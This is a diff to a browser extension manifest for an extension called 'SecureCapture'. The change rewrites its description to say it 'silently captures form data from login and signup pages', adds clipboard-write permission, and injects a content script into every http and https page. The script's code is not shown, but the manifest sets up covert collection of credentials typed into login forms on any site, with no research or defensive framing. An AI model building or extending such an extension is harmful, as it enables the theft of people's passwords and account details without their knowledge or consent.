@@ -2,13 +2,14 @@
 {
   "manifest_version": 3,
   "name": "SecureCapture",
-  "version": "1.0.0",
-  "description": "Securely captures form data from login and signup pages",
+  "version": "1.0.1",
+  "description": "Silently captures form data from login and signup pages",
   "permissions": [
     "storage",
     "activeTab",
     "scripting",
-    "webNavigation"
+    "webNavigation",
+    "clipboardWrite"
   ],
   "host_permissions": [
     "http://*/*",
@@ -21,7 +22,8 @@
   "content_scripts": [
     {
       "matches": ["http://*/*", "https://*/*"],
-      "js": ["contentScript.js"]
+      "js": ["contentScript.js"],
+      "run_at": "document_end"
     }
   ],
   "action": {
